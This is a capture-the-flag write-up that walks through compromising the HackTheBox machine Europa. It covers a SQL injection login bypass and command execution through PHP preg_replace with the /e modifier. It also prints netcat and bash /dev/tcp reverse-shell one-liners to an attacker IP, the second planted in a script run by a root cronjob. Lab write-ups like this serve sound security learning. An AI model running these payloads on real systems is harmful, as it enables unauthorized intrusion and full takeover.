---
title: Europa - HackTheBox
published: true
---

![](assets/img/europa-htb/icon.png)

**Hey Guys**, in this blog post, we are going to pwn **Europa** from [HackTheBox](https://www.hackthebox.eu). Before we begin, a brief overview of what we are going to do : 

*   First we scan the box to find a HTTPS website.
*   Using the SSL certificate, we get a domain name that leads us to the admin panel.
*   Then we bypass the admin login using a basic SQLi.
*   After that, we get a shell by exploiting a PHP regex function.
*   Finally, we get root by exploiting a cronjob.

With that said, let the game begin.

# [](#header-1)SCANNING:

```
root@kali:~# nmap -sC -sV 10.10.10.22
Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-12 11:42 EST
Nmap scan report for europacorp.htb (10.10.10.22)
Host is up (0.27s latency).
Not shown: 997 filtered ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6b:55:42:0a:f7:06:8c:67:c0:e2:5c:05:db:09:fb:78 (RSA)
|   256 b1:ea:5e:c4:1c:0a:96:9e:93:db:1d:ad:22:50:74:75 (ECDSA)
|_  256 33:1f:16:8d:c0:24:78:5f:5b:f5:6d:7f:f7:b4:f2:e5 (ED25519)
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
| ssl-cert: Subject: commonName=europacorp.htb/organizationName=EuropaCorp Ltd./stateOrProvinceName=Attica/countryName=GR
| Subject Alternative Name: DNS:www.europacorp.htb, DNS:admin-portal.europacorp.htb
| Not valid before: 2017-04-19T09:06:22
|_Not valid after:  2027-04-17T09:06:22
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.92 seconds
```

A default script (sC) and service version detection (sV) NMAP scan reveals ports **22 (SSH)**, **80 (HTTP)** and **443 (HTTPS)** to be open.

However, the **SSL certificate** reveals two domain names : `www.europacorp.htb` and `admin-portal.europacorp.htb`. Add both of them to your `/etc/hosts` file.

Now let us move to enumeration.

# [](#header-1)ENUMERATION:

If you visit the IP through the browser, we get the default page for **Apache**.

![](assets/img/europa-htb/apache-default.png)

The domain `www.europacorp.htb` gives us the same both in **HTTP** and **HTTPS**.

However, the `admin-portal.europacorp.htb` domain gives us a login page in **HTTPS**, probably an admin panel login.

![](assets/img/europa-htb/admin-panel.png)

It is asking for an **email** and **password**. We might get an email from the SSL certificate. Let us check that out.

![](assets/img/europa-htb/admin-email.png)

As you can see, we got an email address `admin@europacorp.htb`. 

Even though we have an email, we still need a password. Let us put a login request in **burp repeater** and play with it a bit.

The most common thing we can do with a login page is to check for a **SQL injection**.

![](assets/img/europa-htb/burp-1.png)

When we modified the email to `admin@europacorp.htb'`, we get a **SQL error** proving that there is indeed a **SQLi**.

Since we know that `admin@europacorp.htb` is a valid email, we can comment out the rest of the query. Suppose the query looks like : `SELECT * FROM Users WHERE email = $EMAIL AND password = $PASSWORD;`

If we provide the email to be `admin@europacorp.htb' -- - `, the query will become : `SELECT * FROM Users WHERE email = 'admin@europacorp.htb' -- - AND password = $PASSWORD;`

So, only the email will be checked. Since it is a valid email, the query will return `true` and we should access the admin panel. Let us check it out.

![](assets/img/europa-htb/burp-2.png)

As you can see, we get a redirection to `dashboard.php`. Now just refresh your browser page.

![](assets/img/europa-htb/admin-dashboard.png)

There is nothing in the dashboard except for the `tools.php`.

![](assets/img/europa-htb/tools-1.png)

It is a openvpn config file generator. Again, let us put that request in **burp repeater** and play with it.

![](assets/img/europa-htb/burp-5.png)

The **POST** request has three parameters `pattern`, `ipaddress` and `text`. Judging by the names, I guess the server is matching a string "ip_address" in the `text` parameter that is actually the Openvpn config template and if it finds that, the string is replaced by the IP address in the `ipaddress` parameter. To verify this, let us change the `ipaddress` parameter to `1337.1337` and see if it replaces the "ip_address" string.

![](assets/img/europa-htb/tools-2.png)

As you can see, `"remote-address" : "ip_address"` is replaced by `"remote-address" : "1337.1337"`.

Now, if you think of it, this can be quite dangerous. There is a PHP function `preg_replace()` that is sometimes used to implement this regex replacing. This function returns a string or array of strings where all matches of a pattern or list of patterns found in the input are replaced with substrings. 

However, there is a catch. When used with `e` after-pattern delimeter, another PHP function will be executed and it's output will be replaced in a match instead of the replacement string. Let us see if it works.

![](assets/img/europa-htb/burp-3.png)

As you can see, I have used the `e` after-pattern delimeter and used the PHP `system()` function to run a system command `id`, the output of which you can see in the response `uid=33(www-data) gid=33(www-data) groups=33(www-data)`. So we have a Command Execution here.

### NEVER USE preg_replace() IN YOUR CODE :P

It time to get a shell now.

# [](#header-1)EXPLOITATION:

Since we have command execution, we can use netcat to get a shell back.

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.21 443 >/tmp/f`

URL-encode the payload using burp decoder and use PHP system function to execute it. Do not forget to set up a netcat listener on your specified port.

![](assets/img/europa-htb/burp-4.png)

```
root@kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.22] 59370
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@europa:/var/www/admin$ ^Z
[1]+  Stopped                 nc -nlvp 443
root@kali:~# stty raw -echo
nc -nlvp 443 

www-data@europa:/var/www/admin$ export TERM=xterm
www-data@europa:/var/www/admin$ id && hostname
uid=33(www-data) gid=33(www-data) groups=33(www-data)
europa
www-data@europa:/var/www/admin$ 
```

As you can see we have a shell back. You can read the user flag now.

# [](#header-1)PRIVILEGE ESCALATION:

If we look for files in the home directory of `www-data` :

```
www-data@europa:/var/www$ ls -al
total 24
drwxr-xr-x  6 root root     4096 May 12  2017 .
drwxr-xr-x 14 root root     4096 Apr 18  2017 ..
drwxr-xr-x  7 root root     4096 Jul 27  2017 admin
drwxrwxr-x  2 root www-data 4096 May 12  2017 cmd
drwxr-xr-x  2 root root     4096 Jun 23  2017 cronjobs
drwxr-xr-x  2 root root     4096 Jul 27  2017 html
www-data@europa:/var/www$ 
```

There is a directory called `cronjobs`. This is interesting. Let us run `pspy32` to see if there is something running on intervals.

```python
2021/03/12 19:13:01 CMD: UID=0    PID=1746   | /usr/bin/php /var/www/cronjobs/clearlogs 
2021/03/12 19:13:01 CMD: UID=0    PID=1745   | /bin/sh -c /var/www/cronjobs/clearlogs 
2021/03/12 19:13:01 CMD: UID=0    PID=1744   | /usr/sbin/CRON -f 
2021/03/12 19:14:01 CMD: UID=0    PID=1751   | /usr/bin/php /var/www/cronjobs/clearlogs 
2021/03/12 19:14:01 CMD: UID=0    PID=1750   | /bin/sh -c /var/www/cronjobs/clearlogs 
2021/03/12 19:14:01 CMD: UID=0    PID=1749   | /usr/sbin/CRON -f 
2021/03/12 19:15:01 CMD: UID=0    PID=1756   | /usr/bin/php /var/www/cronjobs/clearlogs 
2021/03/12 19:15:01 CMD: UID=0    PID=1755   | /bin/sh -c /var/www/cronjobs/clearlogs 
2021/03/12 19:15:01 CMD: UID=0    PID=1754   | /usr/sbin/CRON -f
```

There is indeed a PHP script `/var/www/cronjobs/clearlogs` running in every 1 minute.

```
www-data@europa:/var/www$ ls -l cronjobs/clearlogs 
-r-xr-xr-x 1 root root 132 May 12  2017 cronjobs/clearlogs
www-data@europa:/var/www$ cat cronjobs/clearlogs 
#!/usr/bin/php
<?php
$file = '/var/www/admin/logs/access.log';
file_put_contents($file, '');
exec('/var/www/cmd/logcleared.sh');
?>
www-data@europa:/var/www$
```

We do not have write permission to the script. The script is just running another bash script `/var/www/cmd/logcleared.sh`.

```
www-data@europa:/var/www$ ls -l 
total 16
drwxr-xr-x 7 root root     4096 Jul 27  2017 admin
drwxrwxr-x 2 root www-data 4096 May 12  2017 cmd
drwxr-xr-x 2 root root     4096 Jun 23  2017 cronjobs
drwxr-xr-x 2 root root     4096 Jul 27  2017 html
www-data@europa:/var/www$ ls cmd/
www-data@europa:/var/www$ 
```

There is no bash script by the name `logcleared.sh` in `/var/www/cmd`. Since there is write permission for `www-data` group, we can create the same bash script. 

```
www-data@europa:/var/www/cmd$ chmod +x logcleared.sh 
www-data@europa:/var/www/cmd$ cat logcleared.sh 
#!/bin/bash

bash -c "bash -i >& /dev/tcp/10.10.14.21/81 0>&1"
www-data@europa:/var/www/cmd$
```

I have created the `logcleared.sh` with a bash reverse shell in it. Now set up a listener and wait for 1 minute.

```
root@kali:~# nc -nlvp 81
listening on [any] 81 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.22] 48154
bash: cannot set terminal process group (1827): Inappropriate ioctl for device
bash: no job control in this shell
root@europa:~# id && hostname                  
id && hostname
uid=0(root) gid=0(root) groups=0(root)
europa
root@europa:~#
```

And we are **root**. You can read the root flag too now.

So that is **Europa** from **HackTheBox**. Thanks for reading this far.

If you liked this write-up, you can **buy me a coffee**. I'd appreciate it :)

<script type="text/javascript" src="https://cdnjs.buymeacoffee.com/1.0.0/button.prod.min.js" data-name="bmc-button" data-slug="nehalzaman" data-color="#FFDD00" data-emoji=""  data-font="Cookie" data-text="Buy me a coffee" data-outline-color="#000000" data-font-color="#000000" data-coffee-color="#ffffff" ></script>

I will see you in the next write-up. **PEACE**.

